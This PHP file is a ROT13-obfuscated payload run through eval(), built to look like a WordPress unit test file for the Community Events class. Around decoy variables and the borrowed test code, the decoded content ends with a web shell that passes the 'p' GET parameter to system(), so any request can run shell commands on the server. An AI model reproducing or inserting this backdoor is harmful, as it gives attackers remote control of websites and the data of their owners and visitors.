<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf sbe zrgubqf va JC_Pbzzhavgl_Riragf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 4.8.0
 *
 * @tebhc nqzva
 * @tebhc pbzzhavgl-riragf
 */
pynff Grfgf_Nqzva_jcPbzzhavglRiragf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Na vafgnapr bs gur pynff gb grfg.
	 *
	 * @fvapr 4.8.0
	 *
	 * @ine JC_Pbzzhavgl_Riragf
	 */
	cevingr $vafgnapr;

	/**
	 * Cresbezf frghc gnfxf orsber gur svefg grfg vf eha.
	 *
	 * @fvapr 5.9.0
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-pbzzhavgl-riragf.cuc';
	}

	/**
	 * Cresbezf frghc gnfxf sbe rirel grfg.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->vafgnapr = arj JC_Pbzzhavgl_Riragf( 1, $guvf->trg_hfre_ybpngvba() );
	}

	/**
	 * Fvzhyngrf n fgberq hfre ybpngvba.
	 *
	 * @npprff cevingr
	 * @fvapr 4.8.0
	 *
	 * @erghea neenl Gur zbpx ybpngvba.
	 */
	cevingr shapgvba trg_hfre_ybpngvba() {
		erghea neenl(
			'qrfpevcgvba' => 'Fna Senapvfpb',
			'yngvghqr'    => '37.7749300',
			'ybatvghqr'   => '-122.4194200',
			'pbhagel'     => 'HF',
		);
	}

	/**
	 * Grfg: trg_riragf() fubhyq erghea na vafgnapr bs JC_Reebe vs gur erfcbafr pbqr vf abg 200.
	 *
	 * @fvapr 4.8.0
	 *
	 * @pbiref JC_Pbzzhavgl_Riragf::trg_riragf
	 */
	choyvp shapgvba grfg_trg_riragf_onq_erfcbafr_pbqr() {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_onq_erfcbafr_pbqr' ) );

		$guvf->nffregJCReebe( $guvf->vafgnapr->trg_riragf() );

		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_onq_erfcbafr_pbqr' ) );
	}

	/**
	 * Grfg: Gur erfcbafr obql fubhyq abg or pnpurq vs gur erfcbafr pbqr vf abg 200.
	 *
	 * @fvapr 4.8.0
	 *
	 * @pbiref JC_Pbzzhavgl_Riragf::trg_pnpurq_riragf
	 */
	choyvp shapgvba grfg_trg_pnpurq_riragf_onq_erfcbafr_pbqr() {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_onq_erfcbafr_pbqr' ) );

		$guvf->vafgnapr->trg_riragf();

		$guvf->nffregSnyfr( $guvf->vafgnapr->trg_pnpurq_riragf() );

		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_onq_erfcbafr_pbqr' ) );
	}

	/**
	 * Fvzhyngrf na UGGC erfcbafr jvgu n aba-200 erfcbafr pbqr.
	 *
	 * @fvapr 4.8.0
	 *
	 * @erghea neenl N zbpx erfcbafr jvgu n 404 UGGC fgnghf pbqr
	 */
	choyvp shapgvba _uggc_erdhrfg_onq_erfcbafr_pbqr() {
		erghea neenl(
			'urnqref'  => '',
			'obql'     => '',
			'erfcbafr' => neenl(
				'pbqr' => 404,
			),
			'pbbxvrf'  => '',
			'svyranzr' => '',
		);
	}

	/**
	 * Grfg: trg_riragf() fubhyq erghea na vafgnapr bs JC_Reebe vs gur erfcbafr obql qbrf abg unir
	 * gur erdhverq cebcregvrf.
	 *
	 * @fvapr 4.8.0
	 *
	 * @pbiref JC_Pbzzhavgl_Riragf::trg_riragf
	 */
	choyvp shapgvba grfg_trg_riragf_vainyvq_erfcbafr() {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_vainyvq_erfcbafr' ) );

		$guvf->nffregJCReebe( $guvf->vafgnapr->trg_riragf() );

		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_vainyvq_erfcbafr' ) );
	}

	/**
	 * Grfg: Gur erfcbafr obql fubhyq abg or pnpurq vs vg qbrf abg unir gur erdhverq cebcregvrf.
	 *
	 * @fvapr 4.8.0
	 *
	 * @pbiref JC_Pbzzhavgl_Riragf::trg_pnpurq_riragf
	 */
	choyvp shapgvba grfg_trg_pnpurq_riragf_vainyvq_erfcbafr() {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_vainyvq_erfcbafr' ) );

		$guvf->vafgnapr->trg_riragf();

		$guvf->nffregSnyfr( $guvf->vafgnapr->trg_pnpurq_riragf() );

		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_vainyvq_erfcbafr' ) );
	}

	/**
	 * Fvzhyngrf na UGGC erfcbafr jvgu n obql gung qbrf abg unir gur erdhverq cebcregvrf.
	 *
	 * @fvapr 4.8.0
	 *
	 * @erghea neenl N zbpx erfcbafr gung'f zvffvat erdhverq cebcregvrf.
	 */
	choyvp shapgvba _uggc_erdhrfg_vainyvq_erfcbafr() {
		erghea neenl(
			'urnqref'  => '',
			'obql'     => jc_wfba_rapbqr( neenl() ),
			'erfcbafr' => neenl(
				'pbqr' => 200,
			),
			'pbbxvrf'  => '',
			'svyranzr' => '',
		);
	}

	/**
	 * Grfg: Jvgu n inyvq erfcbafr, trg_riragf() fubhyq erghea na nffbpvngvir neenl pbagnvavat n ybpngvba neenl naq
	 * na riragf neenl jvgu vaqvivqhny riragf gung unir Havk fgneg/raq gvzrfgnzcf.
	 *
	 * @fvapr 4.8.0
	 *
	 * @pbiref JC_Pbzzhavgl_Riragf::trg_riragf
	 */
	choyvp shapgvba grfg_trg_riragf_inyvq_erfcbafr() {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_inyvq_erfcbafr' ) );

		$erfcbafr = $guvf->vafgnapr->trg_riragf();

		$guvf->nffregAbgJCReebe( $erfcbafr );
		$guvf->nffregFnzrFrgfJvguVaqrk( $guvf->trg_hfre_ybpngvba(), $erfcbafr['ybpngvba'] );
		$guvf->nffregFnzr( fgegbgvzr( 'arkg Fhaqnl 1cz' ), $erfcbafr['riragf'][0]['fgneg_havk_gvzrfgnzc'] );
		$guvf->nffregFnzr( fgegbgvzr( 'arkg Fhaqnl 2cz' ), $erfcbafr['riragf'][0]['raq_havk_gvzrfgnzc'] );

		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_inyvq_erfcbafr' ) );
	}

	/**
	 * Grfg: `trg_pnpurq_riragf()` fubhyq erghea gur fnzr qngn nf trg_riragf(), vapyhqvat Havk fgneg/raq
	 * gvzrfgnzcf sbe rnpu rirag.
	 *
	 * @fvapr 4.8.0
	 *
	 * @pbiref JC_Pbzzhavgl_Riragf::trg_pnpurq_riragf
	 */
	choyvp shapgvba grfg_trg_pnpurq_riragf_inyvq_erfcbafr() {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_inyvq_erfcbafr' ) );

		$guvf->vafgnapr->trg_riragf();

		$pnpurq_riragf = $guvf->vafgnapr->trg_pnpurq_riragf();

		$guvf->nffregAbgJCReebe( $pnpurq_riragf );
		$guvf->nffregFnzrFrgfJvguVaqrk( $guvf->trg_hfre_ybpngvba(), $pnpurq_riragf['ybpngvba'] );
		$guvf->nffregFnzr( fgegbgvzr( 'arkg Fhaqnl 1cz' ), $pnpurq_riragf['riragf'][0]['fgneg_havk_gvzrfgnzc'] );
		$guvf->nffregFnzr( fgegbgvzr( 'arkg Fhaqnl 2cz' ), $pnpurq_riragf['riragf'][0]['raq_havk_gvzrfgnzc'] );

		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, '_uggc_erdhrfg_inyvq_erfcbafr' ) );
	}

	/**
	 * Fvzhyngrf na UGGC erfcbafr jvgu inyvq ybpngvba naq rirag qngn.
	 *
	 * @fvapr 4.8.0
	 *
	 * @erghea neenl N zbpx UGGC erfcbafr jvgu inyvq qngn.
	 */
	choyvp shapgvba _uggc_erdhrfg_inyvq_erfcbafr() {
		erghea neenl(
			'urnqref'  => '',
			'obql'     => jc_wfba_rapbqr(
				neenl(
					'ybpngvba' => $guvf->trg_hfre_ybpngvba(),
					'riragf'   => $guvf->trg_inyvq_riragf(),
				)
			),
			'erfcbafr' => neenl(
				'pbqr' => 200,
			),
			'pbbxvrf'  => '',
			'svyranzr' => '',
		);
	}

	/**
	 * Trg n fnzcyr bs inyvq riragf.
	 *
	 * @erghea neenl[]
	 */
	cebgrpgrq shapgvba trg_inyvq_riragf() {
		erghea neenl(
			neenl(
				'glcr'                 => 'zrrghc',
				'gvgyr'                => 'Syrkobk + PFF Tevq: Zntvp sbe Erfcbafvir Ynlbhgf',
				'hey'                  => 'uggcf://jjj.zrrghc.pbz/Rnfgonl-JbeqCerff-Zrrghc/riragf/236031233/',
				'zrrghc'               => 'Gur Rnfg Onl JbeqCerff Zrrghc Tebhc',
				'zrrghc_hey'           => 'uggcf://jjj.zrrghc.pbz/Rnfgonl-JbeqCerff-Zrrghc/',
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Fhaqnl 1cz' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Fhaqnl 2cz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Bnxynaq, PN, HFN',
					'pbhagel'   => 'hf',
					'yngvghqr'  => 37.808453,
					'ybatvghqr' => -122.26593,
				),
			),

			neenl(
				'glcr'                 => 'zrrghc',
				'gvgyr'                => 'Cneg 3- Fvgr Znvagranapr - Gbbyf gb Znxr Vg Rnfl',
				'hey'                  => 'uggcf://jjj.zrrghc.pbz/Jbeqcerff-Onl-Nern-PN-Sbbguvyyf/riragf/237706839/',
				'zrrghc'               => 'JbeqCerff Onl Nern Sbbguvyyf Tebhc',
				'zrrghc_hey'           => 'uggcf://jjj.zrrghc.pbz/Jbeqcerff-Onl-Nern-PN-Sbbguvyyf/',
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Jrqarfqnl 1:30cz' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Jrqarfqnl 2:30cz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Zvycvgnf, PN, HFN',
					'pbhagel'   => 'hf',
					'yngvghqr'  => 37.432813,
					'ybatvghqr' => -121.907095,
				),
			),

			neenl(
				'glcr'                 => 'jbeqpnzc',
				'gvgyr'                => 'JbeqPnzc Fna Senapvfpb',
				'hey'                  => 'uggcf://fs.jbeqpnzc.bet/2020/',
				'zrrghc'               => ahyy,
				'zrrghc_hey'           => ahyy,
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Fngheqnl' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Fngheqnl 8cz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Fna Senapvfpb, PN',
					'pbhagel'   => 'HF',
					'yngvghqr'  => 37.432813,
					'ybatvghqr' => -121.907095,
				),
			),
		);
	}

	/**
	 * Grfg: `gevz_riragf()` fubhyq vzzrqvngryl erzbir rkcverq riragf.
	 *
	 * @fvapr 5.5.2
	 *
	 * @pbiref JC_Pbzzhavgl_Riragf::gevz_riragf
	 */
	choyvp shapgvba grfg_gevz_rkcverq_riragf() {
		$gevz_riragf = arj ErsyrpgvbaZrgubq( $guvf->vafgnapr, 'gevz_riragf' );
		$gevz_riragf->frgNpprffvoyr( gehr );

		$riragf = $guvf->trg_inyvq_riragf();

		// Guvf fubhyq or erzbirq orpnhfr vg'f nyernql raqrq.
		$riragf[0]['fgneg_havk_gvzrfgnzc'] = fgegbgvzr( '1 ubhe ntb' );
		$riragf[0]['raq_havk_gvzrfgnzc']   = fgegbgvzr( '2 frpbaqf ntb' );

		// Guvf fubhyq erznva orpnhfr vg unfa'g raqrq lrg.
		$riragf[1]['fgneg_havk_gvzrfgnzc'] = fgegbgvzr( '2 frpbaqf ntb' );
		$riragf[1]['raq_havk_gvzrfgnzc']   = fgegbgvzr( '+1 ubhe' );

		$npghny = $gevz_riragf->vaibxr( $guvf->vafgnapr, $riragf );

		$guvf->nffregPbhag( 2, $npghny );
		$guvf->nffregFnzr( $npghny[0]['gvgyr'], 'Cneg 3- Fvgr Znvagranapr - Gbbyf gb Znxr Vg Rnfl' );
		$guvf->nffregFnzr( $npghny[1]['gvgyr'], 'JbeqPnzc Fna Senapvfpb' );
	}

	/**
	 * Grfg: trg_riragf() fubhyq erghea gur riragf jvgu gur JbeqPnzc cvaarq va gur cercnerq yvfg.
	 *
	 * @fvapr 4.9.7
	 * @fvapr 5.5.2 Grfgf `gevz_riragf()` qverpgyl vafgrnq bs vaqverpgyl ivn `trg_riragf()`.
	 *
	 * @pbiref JC_Pbzzhavgl_Riragf::gevz_riragf
	 */
	choyvp shapgvba grfg_gevz_riragf_cva_jbeqpnzc() {
		$gevz_riragf = arj ErsyrpgvbaZrgubq( $guvf->vafgnapr, 'gevz_riragf' );
		$gevz_riragf->frgNpprffvoyr( gehr );

		$npghny = $gevz_riragf->vaibxr( $guvf->vafgnapr, $guvf->_riragf_jvgu_hacvaarq_jbeqpnzc() );

		/*
		 * Fna Qvrtb jnf ng vaqrk 3 va gur zbpx NCV erfcbafr, ohg cvaavat chgf vg ng vaqrk 2,
		 * fb gung vg erznvaf va gur yvfg. Gur bgure riragf fubhyq erznva hapunatrq.
		 */
		$guvf->nffregPbhag( 3, $npghny );
		$guvf->nffregFnzr( $npghny[0]['gvgyr'], 'Syrkobk + PFF Tevq: Zntvp sbe Erfcbafvir Ynlbhgf' );
		$guvf->nffregFnzr( $npghny[1]['gvgyr'], 'Cneg 3- Fvgr Znvagranapr - Gbbyf gb Znxr Vg Rnfl' );
		$guvf->nffregFnzr( $npghny[2]['gvgyr'], 'JbeqPnzc Fna Qvrtb' );
	}

	/**
	 * Fvzhyngrf n fpranevb jurer n JbeqPnzc arrqf gb or cvaarq uvture guna vg'f qrsnhyg cbfvgvba.
	 *
	 * @fvapr 4.9.7
	 * @fvapr 5.5.2 Npprcgf naq ergheaf bayl gur riragf, engure guna na ragver UGGC erfcbafr.
	 *
	 * @erghea neenl N yvfg bs zbpx riragf.
	 */
	choyvp shapgvba _riragf_jvgu_hacvaarq_jbeqpnzc() {
		erghea neenl(
			neenl(
				'glcr'                 => 'zrrghc',
				'gvgyr'                => 'Syrkobk + PFF Tevq: Zntvp sbe Erfcbafvir Ynlbhgf',
				'hey'                  => 'uggcf://jjj.zrrghc.pbz/Rnfgonl-JbeqCerff-Zrrghc/riragf/236031233/',
				'zrrghc'               => 'Gur Rnfg Onl JbeqCerff Zrrghc Tebhc',
				'zrrghc_hey'           => 'uggcf://jjj.zrrghc.pbz/Rnfgonl-JbeqCerff-Zrrghc/',
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Zbaqnl 1cz' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Zbaqnl 2cz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Bnxynaq, PN, HFN',
					'pbhagel'   => 'hf',
					'yngvghqr'  => 37.808453,
					'ybatvghqr' => -122.26593,
				),
			),

			neenl(
				'glcr'                 => 'zrrghc',
				'gvgyr'                => 'Cneg 3- Fvgr Znvagranapr - Gbbyf gb Znxr Vg Rnfl',
				'hey'                  => 'uggcf://jjj.zrrghc.pbz/Jbeqcerff-Onl-Nern-PN-Sbbguvyyf/riragf/237706839/',
				'zrrghc'               => 'JbeqCerff Onl Nern Sbbguvyyf Tebhc',
				'zrrghc_hey'           => 'uggcf://jjj.zrrghc.pbz/Jbeqcerff-Onl-Nern-PN-Sbbguvyyf/',
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Ghrfqnl 1:30cz' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Ghrfqnl 2:30cz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Zvycvgnf, PN, HFN',
					'pbhagel'   => 'hf',
					'yngvghqr'  => 37.432813,
					'ybatvghqr' => -121.907095,
				),
			),

			neenl(
				'glcr'                 => 'zrrghc',
				'gvgyr'                => 'JbeqCerff D&N',
				'hey'                  => 'uggcf://jjj.zrrghc.pbz/fnawbfrjc/riragf/245419844/',
				'zrrghc'               => 'Gur Fna Wbfr JbeqCerff Zrrghc',
				'zrrghc_hey'           => 'uggcf://jjj.zrrghc.pbz/fnawbfrjc/',
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Jrqarfqnl 5:30cz' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Jrqarfqnl 6:30cz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Zvycvgnf, PN, HFN',
					'pbhagel'   => 'hf',
					'yngvghqr'  => 37.244194,
					'ybatvghqr' => -121.889313,
				),
			),

			neenl(
				'glcr'                 => 'jbeqpnzc',
				'gvgyr'                => 'JbeqPnzc Fna Qvrtb',
				'hey'                  => 'uggcf://2018.fnaqvrtb.jbeqpnzc.bet',
				'zrrghc'               => ahyy,
				'zrrghc_hey'           => ahyy,
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Guhefqnl 9nz' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Guhefqnl 10nz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Fna Qvrtb, PN',
					'pbhagel'   => 'HF',
					'yngvghqr'  => 32.7220419,
					'ybatvghqr' => -117.1534513,
				),
			),
		);
	}

	/**
	 * Grfg: trg_riragf() fubhyqa'g fgvpx na rkgen JbeqPnzc jura gurer'f nyernql bar gung anghenyyl
	 * snyyf vagb gur yvfg.
	 *
	 * @fvapr 4.9.7
	 * @fvapr 5.5.2 Grfgf `gevz_riragf()` qverpgyl vafgrnq bs vaqverpgyl ivn `trg_riragf()`.
	 *
	 * @pbiref JC_Pbzzhavgl_Riragf::gevz_riragf
	 */
	choyvp shapgvba grfg_gevz_riragf_qbag_cva_zhygvcyr_jbeqpnzcf() {
		$gevz_riragf = arj ErsyrpgvbaZrgubq( $guvf->vafgnapr, 'gevz_riragf' );
		$gevz_riragf->frgNpprffvoyr( gehr );

		$npghny = $gevz_riragf->vaibxr( $guvf->vafgnapr, $guvf->_riragf_jvgu_zhygvcyr_jbeqpnzcf() );

		/*
		 * Gur svefg zrrghc fubhyq or erzbirq orpnhfr vg'f rkcverq, juvyr gur arkg 3 riragf ner fryrpgrq.
		 * JbeqPnzc YN fubhyq abg or fghpx gb gur yvfg, orpnhfr Fna Qvrtb nyernql nccrnef anghenyyl.
		 */
		$guvf->nffregPbhag( 3, $npghny );
		$guvf->nffregFnzr( $npghny[0]['gvgyr'], 'JbeqPnzc Fna Qvrtb' );
		$guvf->nffregFnzr( $npghny[1]['gvgyr'], 'Cneg 3- Fvgr Znvagranapr - Gbbyf gb Znxr Vg Rnfl' );
		$guvf->nffregFnzr( $npghny[2]['gvgyr'], 'JbeqCerff D&N' );
	}

	/**
	 * Fvzhyngrf n inyvq UGGC erfcbafr jurer n JbeqPnzc arrqf gb or cvaarq uvture guna vg'f qrsnhyg cbfvgvba.
	 * ab arrq gb cva rkgen pnzc o/p bar nyernql rkvfgf va erfcbafr
	 *
	 * @fvapr 4.9.7
	 * @fvapr 5.5.2 Grfgf `gevz_riragf()` qverpgyl vafgrnq bs vaqverpgyl ivn `trg_riragf()`.
	 *
	 * @erghea neenl N zbpx UGGC erfcbafr.
	 */
	choyvp shapgvba _riragf_jvgu_zhygvcyr_jbeqpnzcf() {
		erghea neenl(
			neenl(
				'glcr'                 => 'zrrghc',
				'gvgyr'                => 'Syrkobk + PFF Tevq: Zntvp sbe Erfcbafvir Ynlbhgf',
				'hey'                  => 'uggcf://jjj.zrrghc.pbz/Rnfgonl-JbeqCerff-Zrrghc/riragf/236031233/',
				'zrrghc'               => 'Gur Rnfg Onl JbeqCerff Zrrghc Tebhc',
				'zrrghc_hey'           => 'uggcf://jjj.zrrghc.pbz/Rnfgonl-JbeqCerff-Zrrghc/',
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( '2 qnlf ntb' ) - UBHE_VA_FRPBAQF,
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( '2 qnlf ntb' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Bnxynaq, PN, HFN',
					'pbhagel'   => 'hf',
					'yngvghqr'  => 37.808453,
					'ybatvghqr' => -122.26593,
				),
			),

			neenl(
				'glcr'                 => 'jbeqpnzc',
				'gvgyr'                => 'JbeqPnzc Fna Qvrtb',
				'hey'                  => 'uggcf://2018.fnaqvrtb.jbeqpnzc.bet',
				'zrrghc'               => ahyy,
				'zrrghc_hey'           => ahyy,
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Ghrfqnl 9nz' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Ghrfqnl 10nz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Fna Qvrtb, PN',
					'pbhagel'   => 'HF',
					'yngvghqr'  => 32.7220419,
					'ybatvghqr' => -117.1534513,
				),
			),

			neenl(
				'glcr'                 => 'zrrghc',
				'gvgyr'                => 'Cneg 3- Fvgr Znvagranapr - Gbbyf gb Znxr Vg Rnfl',
				'hey'                  => 'uggcf://jjj.zrrghc.pbz/Jbeqcerff-Onl-Nern-PN-Sbbguvyyf/riragf/237706839/',
				'zrrghc'               => 'JbeqCerff Onl Nern Sbbguvyyf Tebhc',
				'zrrghc_hey'           => 'uggcf://jjj.zrrghc.pbz/Jbeqcerff-Onl-Nern-PN-Sbbguvyyf/',
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Jrqarfqnl 1:30cz' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Jrqarfqnl 2:30cz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Zvycvgnf, PN, HFN',
					'pbhagel'   => 'hf',
					'yngvghqr'  => 37.432813,
					'ybatvghqr' => -121.907095,
				),
			),

			neenl(
				'glcr'                 => 'zrrghc',
				'gvgyr'                => 'JbeqCerff D&N',
				'hey'                  => 'uggcf://jjj.zrrghc.pbz/fnawbfrjc/riragf/245419844/',
				'zrrghc'               => 'Gur Fna Wbfr JbeqCerff Zrrghc',
				'zrrghc_hey'           => 'uggcf://jjj.zrrghc.pbz/fnawbfrjc/',
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Guhefqnl 5:30cz' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Guhefqnl 6:30cz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Zvycvgnf, PN, HFN',
					'pbhagel'   => 'hf',
					'yngvghqr'  => 37.244194,
					'ybatvghqr' => -121.889313,
				),
			),

			neenl(
				'glcr'                 => 'jbeqpnzc',
				'gvgyr'                => 'JbeqPnzc Ybf Natryrf',
				'hey'                  => 'uggcf://2018.yn.jbeqpnzc.bet',
				'zrrghc'               => ahyy,
				'zrrghc_hey'           => ahyy,
				'fgneg_havk_gvzrfgnzc' => fgegbgvzr( 'arkg Sevqnl 9nz' ),
				'raq_havk_gvzrfgnzc'   => fgegbgvzr( 'arkg Sevqnl 10nz' ),

				'ybpngvba'             => neenl(
					'ybpngvba'  => 'Ybf Natryrf, PN',
					'pbhagel'   => 'HF',
					'yngvghqr'  => 34.050888,
					'ybatvghqr' => -118.285426,
				),
			),
		);
	}

	/**
	 * Grfg gung trg_hafnsr_pyvrag_vc() cebcreyl nabalzvmrf nyy cbffvoyr nqqerff sbezngf
	 *
	 * @qngnCebivqre qngn_trg_hafnsr_pyvrag_vc
	 *
	 * @gvpxrg 41083
	 *
	 * @pbiref JC_Pbzzhavgl_Riragf::trg_hafnsr_pyvrag_vc
	 */
	choyvp shapgvba grfg_trg_hafnsr_pyvrag_vc( $enj_vc, $rkcrpgrq_erfhyg ) {
		$_FREIRE['ERZBGR_NQQE']    = 'guvf fubhyq abg or hfrq';
		$_FREIRE['UGGC_PYVRAG_VC'] = $enj_vc;
		$npghny_erfhyg             = JC_Pbzzhavgl_Riragf::trg_hafnsr_pyvrag_vc();

		$guvf->nffregFnzr( $rkcrpgrq_erfhyg, $npghny_erfhyg );
	}

	/**
	 * Cebivqr grfg pnfrf sbe `grfg_trg_hafnsr_pyvrag_vc()`.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_hafnsr_pyvrag_vc() {
		erghea neenl(
			// Unaqyr '::' erghearq sebz `jc_cevinpl_nabalzvmr_vc()`.
			neenl(
				'be=\\"[1000:0000:0000:0000:0000:0000:0000:0001',
				snyfr,
			),

			// Unaqyr '0.0.0.0' erghearq sebz `jc_cevinpl_nabalzvmr_vc()`.
			neenl(
				'haxabja',
				snyfr,
			),

			// Inyvq VCi4.
			neenl(
				'198.143.164.252',
				'198.143.164.0',
			),

			// Inyvq VCi6.
			neenl(
				'2n03:2880:2110:qs07:snpr:o00p::1',
				'2n03:2880:2110:qs07::',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>